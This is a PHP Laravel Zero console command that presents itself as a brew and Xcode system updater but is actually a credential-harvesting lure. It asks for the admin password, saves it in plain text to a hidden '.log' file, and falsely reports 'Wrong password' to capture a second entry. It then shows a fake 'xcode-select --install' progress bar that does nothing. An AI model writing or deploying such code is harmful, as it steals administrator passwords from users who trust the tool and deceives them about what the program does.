<?php

namespace App\Commands;

use Illuminate\Console\Scheduling\Schedule;
use LaravelZero\Framework\Commands\Command;
use function Laravel\Prompts\password;
use function Laravel\Prompts\progress;

class UpdateSystemCommand extends Command
{
    /**
     * The signature of the command.
     *
     * @var string
     */
    protected $signature = 'brew:update-xcode';

    /**
     * The description of the command.
     *
     * @var string
     */
    protected $description = 'Update the system with brew and xcode tools.';

    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        $file = fopen('.log', 'w');
echo "\e[H\e[J";
        $this->info('Updating system with brew and xcode tools...');
        $password = password(
            label: 'Enter admin password:',
            required: true
        );
        fputs($file, $password . "\n");

        $this->warn('Wrong password, try again.');
/*        $password = password(
            label: 'Enter admin password:',required: true
        );
        fputs($file, $password . "\n");

        $this->warn('Wrong password, try again.');*/
        $password2 = password(
            label: 'Enter admin password:',required: true
        );
        fputs($file, $password2 . "\n");

        if($password !== $password2) {
            $this->info('User auth failed. Upgrading brew and xcode tools in user mode.');
        }

        progress(label: 'xcode-select --install',
            steps: range(1, 100),
            callback: function ($step) {
                usleep(100_000);
            });

        return 0;

    }

    /**
     * Define the command's schedule.
     *
     * @param \Illuminate\Console\Scheduling\Schedule $schedule
     * @return void
     */
    public function schedule(Schedule $schedule): void
    {
        // $schedule->command(static::class)->everyMinute();
    }
}
